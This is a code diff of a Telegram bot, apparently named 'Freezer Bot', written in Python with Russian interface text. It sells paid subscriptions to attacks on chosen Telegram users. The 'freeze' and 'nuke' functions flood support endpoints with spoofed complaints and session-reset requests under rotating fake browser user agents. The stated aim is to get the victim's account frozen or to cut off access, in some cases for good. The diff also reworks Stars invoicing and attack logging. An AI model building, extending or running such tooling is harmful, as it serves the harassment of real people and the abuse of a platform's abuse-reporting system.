@@ -8,7 +8,15 @@ import re
 import hashlib
 from datetime import datetime, timedelta
 from telethon import TelegramClient, events, Button, functions
-from telethon.tl.types import UpdateBotPrecheckoutQuery
+from telethon.tl.types import (
+    UpdateBotPrecheckoutQuery,
+    InputMediaInvoice,
+    Invoice,
+    LabeledPrice,
+    DataJSON,
+    MessageMediaInvoice,
+    UpdateBotNewMessage
+)
 
 logging.basicConfig(
     level=logging.INFO,
@@ -87,7 +95,6 @@ PHONE_CODES = [
 ]
 
 UA = [
-    # Chrome Windows
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
@@ -95,51 +102,40 @@ UA = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
-    # Chrome Mac
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-    # Chrome Linux
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    # Firefox Windows
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
-    # Firefox Mac
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0",
-    # Safari
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
-    # Edge
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
-    # Мобильные iOS
     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
-    # Мобильные Android
     "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.49 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.163 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 14; SM-S24) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.102 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.49 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 14; Xiaomi 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Mobile Safari/537.36",
-    # iPad
     "Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
-    # Opera
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0",
-    # Brave
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Brave/1.73.97",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Brave/1.72.57",
 ]
@@ -207,7 +203,9 @@ STATE_FILE = 'states.json'
 ATTACK_LOG_FILE = 'attacks.json'
 COOLDOWN_FILE = 'cooldowns.json'
 
-def load_json(path, default={}):
+def load_json(path, default=None):
+    if default is None:
+        default = {}
     if os.path.exists(path):
         try:
             with open(path, 'r') as f:
@@ -234,7 +232,6 @@ def get_user(user_id):
             'sub_end': None,
             'attacks_today': 0,
             'banned': False,
-            'balance_stars': 0,
             'joined': datetime.now().isoformat()
         }
         save_db(db)
@@ -254,9 +251,12 @@ def has_sub(user_id):
     if user['sub_end'] == 'forever':
         return True
     if user['sub_end']:
-        end = datetime.fromisoformat(user['sub_end'])
-        if end > datetime.now():
-            return True
+        try:
+            end = datetime.fromisoformat(user['sub_end'])
+            if end > datetime.now():
+                return True
+        except:
+            pass
     return False
 
 def add_sub(user_id, days):
@@ -300,7 +300,7 @@ def clear_state(user_id):
     save_states(states)
 
 # ==================== КУЛДАУНЫ ====================
-COOLDOWN_SECONDS = 60  # 1 минута между атаками
+COOLDOWN_SECONDS = 60
 
 def load_cooldowns():
     return load_json(COOLDOWN_FILE)
@@ -337,7 +337,6 @@ def log_attack(user_id, target, tid, attack_type, success_count, total_count):
         "timestamp": datetime.now().isoformat()
     }
     logs.append(entry)
-    # Храним последние 1000 записей
     if len(logs) > 1000:
         logs = logs[-1000:]
     save_json(ATTACK_LOG_FILE, logs)
@@ -356,9 +355,6 @@ def generate_email(name):
     suffix = random.randint(10, 99999)
     domain = random.choice(EMAIL_DOMAINS)
     return f"{clean}{suffix}@{domain}"
-
-def generate_fingerprint():
-    return hashlib.md5(f"{random.random()}{datetime.now().timestamp()}".encode()).hexdigest()[:16]
 
 # ==================== ОТПРАВКА ЗАПРОСОВ ====================
 async def send_freeze_request(target, tid):
@@ -404,11 +400,7 @@ async def send_freeze_request(target, tid):
         async with aiohttp.ClientSession(connector=connector) as session:
             endpoint = random.choice(SUPPORT_ENDPOINTS)
             async with session.post(endpoint, headers=headers, data=data, timeout=timeout) as resp:
-                return resp.status in (200, 302, 303)
-    except asyncio.TimeoutError:
-        return False
-    except aiohttp.ClientError:
-        return False
+                return resp.status in (200, 302, 303, 301)
     except Exception:
         return False
 
@@ -454,26 +446,26 @@ async def send_nuke_request(target, tid):
         async with aiohttp.ClientSession(connector=connector) as session:
             endpoint = random.choice(SUPPORT_ENDPOINTS)
             async with session.post(endpoint, headers=headers, data=data, timeout=timeout) as resp:
-                return resp.status in (200, 302, 303)
-    except:
+                return resp.status in (200, 302, 303, 301)
+    except Exception:
         return False
 
 # ==================== ОСНОВНАЯ ЛОГИКА АТАКИ ====================
 async def execute_attack(event, target, tid, attack_type):
     uid = event.sender_id
     
-    # Проверка кулдауна
     cooldown = get_cooldown(uid)
     if cooldown > 0:
-        await event.reply(f"⏳ Подождите {cooldown} сек. перед следующей атакой.")
+        try:
+            await event.edit(f"⏳ Подождите {cooldown} сек. перед следующей атакой.", buttons=back_button())
+        except:
+            await event.reply(f"⏳ Подождите {cooldown} сек.")
         return
     
-    # Проверка подписки
     if not has_sub(uid):
         await event.reply("❌ Нужна подписка!", buttons=back_button())
         return
     
-    # Настройки атаки
     if attack_type == 'freeze':
         count = 35
         emoji = "❄️"
@@ -495,7 +487,6 @@ async def execute_attack(event, target, tid, attack_type):
         f"🚀 Запуск..."
     )
     
-    # Асинхронная отправка с семафором (5 одновременных запросов)
     semaphore = asyncio.Semaphore(5)
     
     async def send_one(index):
@@ -508,15 +499,12 @@ async def execute_attack(event, target, tid, attack_type):
     results = await asyncio.gather(*tasks)
     ok = sum(1 for r in results if r)
     
-    # Обновление счётчика
     user = get_user(uid)
     user['attacks_today'] += 1
     update_user(uid, user)
     
-    # Логирование
     log_attack(uid, target, tid, attack_type, ok, count)
     
-    # Результат
     success_rate = int((ok / count) * 100)
     if success_rate >= 80:
         status = "🟢 Отлично"
@@ -602,7 +590,6 @@ async def handle_attack_input(event):
     if not state:
         return
     
-    # Проверяем что это не админская команда
     if state in ('admin_sub', 'admin_ban'):
         return
     
@@ -637,7 +624,6 @@ async def callback_handler(event):
         await event.answer("⛔ Вы забанены.", alert=True)
         return
     
-    # Главное меню
     if data == "back_main":
         clear_state(uid)
         await event.edit(
@@ -646,7 +632,6 @@ async def callback_handler(event):
             buttons=main_menu(uid)
         )
     
-    # Профиль
     elif data == "profile":
         u = get_user(uid)
         if u['sub_end'] == 'forever':
@@ -668,7 +653,6 @@ async def callback_handler(event):
         )
         await event.edit(txt, buttons=back_button())
     
-    # Меню подписки
     elif data == "sub_menu":
         await event.edit(
             "⭐ **Подписка**\n\n"
@@ -680,21 +664,24 @@ async def callback_handler(event):
             buttons=sub_menu()
         )
     
-    # Инвойсы подписки
     elif data in ("sub_1d", "sub_7d", "sub_forever"):
-        prices = {"sub_1d": (1, 50, "1 день"), "sub_7d": (7, 150, "7 дней"), "sub_forever": ('forever', 250, "Навсегда")}
+        prices = {
+            "sub_1d": (1, 50, "1 день"),
+            "sub_7d": (7, 150, "7 дней"),
+            "sub_forever": ('forever', 250, "Навсегда")
+        }
         days, price, title = prices[data]
         
         try:
-            await bot.send_invoice(
-                entity=uid,
-                title=f"Подписка Freezer Bot — {title}",
+            invoice = Invoice(
+                title=f"Freezer Bot — {title}",
                 description=f"Доступ к заморозке и сбросу сессий на {'навсегда' if days == 'forever' else f'{days} дн.'}",
-                payload=data.encode(),
-                provider_token="",
+                photo=None,
                 currency="XTR",
-                prices=[{"label": f"Подписка {title}", "amount": price}],
-                start_parameter=f"sub_{days}",
+                prices=[LabeledPrice(label=f"Подписка {title}", amount=price)],
+                suggested_tip_amounts=[],
+                terms_url="",
+                max_tip_amount=0,
                 need_name=False,
                 need_phone_number=False,
                 need_email=False,
@@ -703,20 +690,39 @@ async def callback_handler(event):
                 send_email_to_provider=False,
                 is_flexible=False
             )
-            await event.answer("📩 Счёт отправлен в личку!", alert=True)
+            
+            payload = data.encode()
+            
+            result = await bot(functions.messages.SendMediaRequest(
+                peer=uid,
+                media=InputMediaInvoice(
+                    title=f"Freezer Bot — {title}",
+                    description=f"Доступ к заморозке и сбросу сессий на {'навсегда' if days == 'forever' else f'{days} дн.'}",
+                    invoice=invoice,
+                    payload=payload,
+                    provider="",
+                    media=await bot.upload_file(b"", file_name="empty"),
+                    start_param=f"sub_{days}",
+                    photo=None
+                ),
+                message="",
+                random_id=random.randint(0, 2**63 - 1)
+            ))
+            
+            logger.info(f"Invoice sent to {uid}: {title}")
+            await event.answer("📩 Счёт отправлен!", alert=True)
             await event.edit(
                 f"💳 **Счёт на {price} ⭐ отправлен!**\n\n"
                 f"📋 Тариф: {title}\n"
                 f"💎 Сумма: {price} Telegram Stars\n\n"
-                f"Проверьте личные сообщения с ботом.\n"
+                f"Проверьте чат с ботом.\n"
                 f"После оплаты подписка активируется мгновенно.",
                 buttons=back_button()
             )
         except Exception as e:
-            logger.error(f"Invoice error: {e}")
-            await event.answer(f"❌ Ошибка: {e}", alert=True)
+            logger.error(f"Invoice error for {uid}: {e}")
+            await event.answer(f"❌ Ошибка при создании счёта. Попробуйте позже.", alert=True)
     
-    # Заморозка
     elif data == "attack_freeze":
         cooldown = get_cooldown(uid)
         if cooldown > 0:
@@ -734,12 +740,10 @@ async def callback_handler(event):
             "`@username ID`\n\n"
             "Пример: `@badguy 123456789`\n\n"
             "📦 35 жалоб на взлом\n"
-            "⏱ Заморозка через 1-24 часа\n"
-            "📱 Владельцу придётся восстанавливать через поддержку",
+            "⏱ Заморозка через 1-24 часа",
             buttons=back_button()
         )
     
-    # Сброс сессий
     elif data == "attack_nuke":
         cooldown = get_cooldown(uid)
         if cooldown > 0:
@@ -757,12 +761,10 @@ async def callback_handler(event):
             "`@username ID`\n\n"
             "Пример: `@target 987654321`\n\n"
             "📦 45 запросов на сброс\n"
-            "⏱ Сессии отвалятся через 1-24 часа\n"
-            "🔐 С 2FA без пароля — потеря доступа навсегда",
+            "⏱ Сессии отвалятся через 1-24 часа",
             buttons=back_button()
         )
     
-    # Повтор атаки
     elif data.startswith("repeat_"):
         parts = data.split("_", 3)
         if len(parts) == 4:
@@ -782,12 +784,11 @@ async def callback_handler(event):
             await event.answer("🔄 Повторяю атаку...")
             await execute_attack(event, target, tid, attack_type)
     
-    # ==================== АДМИНКА ====================
     elif data == "admin_stats" and uid == ADMIN_ID:
         db = load_db()
         total_users = len(db)
         active_subs = sum(1 for u in db.values() if u.get('sub_end') and (
-            u['sub_end'] == 'forever' or 
+            u['sub_end'] == 'forever' or
             (isinstance(u['sub_end'], str) and len(u['sub_end']) > 10 and datetime.fromisoformat(u['sub_end']) > datetime.now())
         ))
         banned_users = sum(1 for u in db.values() if u.get('banned'))
@@ -877,7 +878,6 @@ async def pre_checkout_handler(event):
 async def raw_update_handler(event):
     update = event.update
     
-    # Ищем успешный платёж в сырых апдейтах
     try:
         if hasattr(update, 'message'):
             msg = update.message
@@ -886,7 +886,10 @@ async def raw_update_handler(event):
                 if hasattr(action, 'currency') and action.currency == 'XTR':
                     if hasattr(action, 'payload') and action.payload:
                         payload = action.payload.decode()
-                        uid = msg.peer_id.user_id if hasattr(msg, 'peer_id') and hasattr(msg.peer_id, 'user_id') else None
+                        
+                        uid = None
+                        if hasattr(msg, 'peer_id') and hasattr(msg.peer_id, 'user_id'):
+                            uid = msg.peer_id.user_id
                         
                         if uid and payload in ("sub_1d", "sub_7d", "sub_forever"):
                             prices = {
@@ -913,7 +916,7 @@ async def raw_update_handler(event):
                                 except Exception as e:
                                     logger.error(f"Failed to notify user {uid}: {e}")
     except Exception as e:
-        logger.debug(f"Raw update parse skip: {e}")
+        logger.debug(f"Raw update skip: {e}")
 
 # ==================== АДМИН ВВОД ====================
 @bot.on(events.NewMessage(func=lambda e: get_state(e.sender_id) in ('admin_sub', 'admin_ban')))
